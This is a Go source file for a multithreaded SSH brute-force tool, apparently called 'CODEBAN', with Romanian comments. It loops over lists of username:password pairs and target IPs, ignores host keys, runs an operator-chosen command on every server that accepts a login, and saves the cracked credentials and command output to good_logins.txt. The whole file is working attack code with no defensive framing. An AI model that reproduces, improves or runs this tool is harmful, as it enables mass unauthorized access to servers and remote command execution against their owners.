package main

import (
        "bufio"
        "fmt"
        "os"
        "strconv"
        "strings"
        "sync"

        "github.com/fatih/color"
        "golang.org/x/crypto/ssh"
)

var (
        ipUserPairs   = make(map[string]*connectionStatus)
        ipUserPairsMu sync.Mutex
        wg            sync.WaitGroup
)

type connectionStatus struct {
        Good bool
        Bad  bool
        // Adaugă mai multe câmpuri de stare dacă este nevoie
}

const (
        TimeoutSeconds = 5
)

// CustomError este o structură pentru a crea erori personalizate
type CustomError struct {
        Message string
}

// Error implementează interfața error
func (e *CustomError) Error() string {
        return e.Message
}

// NewCustomError creează o nouă instanță de CustomError
func NewCustomError(message string) *CustomError {
        return &CustomError{Message: message}
}

func init() {
        // Nu mai afișăm banner-ul aici
}

func createSSHSession(ip, username, port, password string) (*ssh.Session, error) {
        config := &ssh.ClientConfig{
                User: username,
                Auth: []ssh.AuthMethod{
                        ssh.Password(password),
                },
                HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        }

        client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", ip, port), config)
        if err != nil {
                return nil, NewCustomError(fmt.Sprintf("Error creating SSH session for %s@%s:%s", username, ip, port))
        }

        session, err := client.NewSession()
        if err != nil {
                return nil, NewCustomError(fmt.Sprintf("Error creating SSH session for %s@%s:%s", username, ip, port))
        }

        return session, nil
}

func isNoLogin(err error) bool {
        if err != nil {
                if strings.Contains(err.Error(), "permission denied") {
                        return true
                }
                // Adaugă alte verificări bazate pe comportamentul așteptat
        }
        return false
}

func checkConnectionForIP(user, pass, command, ip, port string) {
        defer wg.Done()

        session, err := createSSHSession(ip, user, port, pass)
        if err != nil {
                if isNoLogin(err) {
                        handleNoLogin(ip, user, pass, port)
                } else {
                        // Ignoră alte erori
                        return
                }
        }
        defer func() {
                if session != nil {
                        session.Close()
                }
        }()

        // Încercă să execute comanda specificată
        var output []byte
        output, err = session.CombinedOutput(command)
        if err != nil {
                if isNoLogin(err) {
                        handleNoLogin(ip, user, pass, port)
                } else {
                        // Ignoră alte erori
                        return
                }
                return
        }

        handleGoodConnection(ip, user, pass, output, port)
}

func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
        upf, err := os.Open(userpassFile)
        if err != nil {
                handleError(NewCustomError(fmt.Sprintf("Passfile - %s", err)))
                return
        }
        defer upf.Close()

        semaphore := make(chan struct{}, threads)

		printBanner()
        fmt.Printf("\n\n\033[01;34m[\033[01;31m▶\033[01;34m] \033[01;34mBrute Started\033[0m\n\n")

        scanner := bufio.NewScanner(upf)
        for scanner.Scan() {
                userPass := scanner.Text()
                parts := strings.SplitN(userPass, ":", 2)
                if len(parts) == 2 {
                        user := parts[0]
                        pass := parts[1]

                        fmt.Printf("\033[01;34m[\033[0m %s \033[01;34m]\033[0m - \033[01;34m[\033[0m %s \033[01;34m]\033[0m\n", user, pass)

                        ipf, err := os.Open(ipListFile)
                        if err != nil {
                                handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
                                continue
                        }
                        defer ipf.Close()

                        scannerIP := bufio.NewScanner(ipf)
                        for scannerIP.Scan() {
                                ip := scannerIP.Text()

                                // Acquire semaphore
                                semaphore <- struct{}{}
                                wg.Add(1)
                                go func(user, pass, command, ip, port string) {
                                        defer wg.Done()
                                        checkConnectionForIP(user, pass, command, ip, port)
                                        // Release semaphore
                                        <-semaphore
                                }(user, pass, command, ip, port)
                        }
                } else {
                        warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
                        color.Cyan(warningMessage)
                }
        }

        // Așteaptă ca toate goroutine-urile să se termine
        wg.Wait()

        // Afișează mesajul de final colorat
        fmt.Println("\n\033[01;34m[\033[01;31m      -- Finished --     \033[01;34m]\033[0m")
}
func printBanner() {
        fmt.Println("\033[01;34m╔══════════════════════════════════════════════════╗")
        fmt.Println("\033[01;34m║\033[01;31m                  C O D E B A N                   \033[01;34m║")
        fmt.Println("\033[01;34m╚══════════════════════════════════════════════════╝\n")
}

func handleError(err error) {
        errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
        color.Cyan(errorMessage)
}

func countLines(filename string) (int, error) {
        file, err := os.Open(filename)
        if err != nil {
                return 0, err
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        count := 0
        for scanner.Scan() {
                count++
        }

        return count, scanner.Err()
}

func handleGoodConnection(ip, user, pass string, output []byte, port string) {
        fmt.Printf("[ Good ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
        fmt.Printf("Command Output: %s\n", output)
        vulnf, err := os.OpenFile("good_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                handleError(NewCustomError("Failed to open good_logins.txt"))
                return
        }
        defer vulnf.Close()

        ipUserPairsMu.Lock()
        defer ipUserPairsMu.Unlock()

        ipKey := fmt.Sprintf("%s:%s", ip, port)

        if _, exists := ipUserPairs[ipKey]; !exists {
                ipUserPairs[ipKey] = &connectionStatus{}
        }
        ipUserPairs[ipKey].Good = true

        logToFile(vulnf, fmt.Sprintf("[ Good ] | %s@%s %s\nCommand Output: %s", user, ip, pass, output))
}

func handleNoLogin(ip, user, pass, port string) {
        fmt.Printf("[ NoLogin ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
        vulnf, err := os.OpenFile("nologin_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                handleError(NewCustomError("Failed to open nologin_logins.txt"))
                return
        }
        defer vulnf.Close()

        ipUserPairsMu.Lock()
        defer ipUserPairsMu.Unlock()

        ipKey := fmt.Sprintf("%s:%s", ip, port)

        if _, exists := ipUserPairs[ipKey]; !exists {
                ipUserPairs[ipKey] = &connectionStatus{}
        }
        ipUserPairs[ipKey].Bad = true

        logToFile(vulnf, fmt.Sprintf("[ NoLogin ] | %s@%s %s", user, ip, pass))
}

func logToFile(file *os.File, logEntry string) {
        if _, err := file.WriteString(logEntry + "\n"); err != nil {
                handleError(NewCustomError("Failed to write to log file"))
        }
}

func main() {
        if len(os.Args) != 6 {
                handleError(NewCustomError("Usage: ./brute <userpass file> <custom command> <ip list file> <port> <threads>"))
                os.Exit(1)
        }

        userpassFile := os.Args[1]
        command := os.Args[2]
        ipListFile := os.Args[3]
        port := os.Args[4]
        threads, err := strconv.Atoi(os.Args[5])
        if err != nil {
                handleError(NewCustomError("Invalid thread count"))
                os.Exit(1)
        }

        checkVPS(userpassFile, command, ipListFile, port, threads)
}
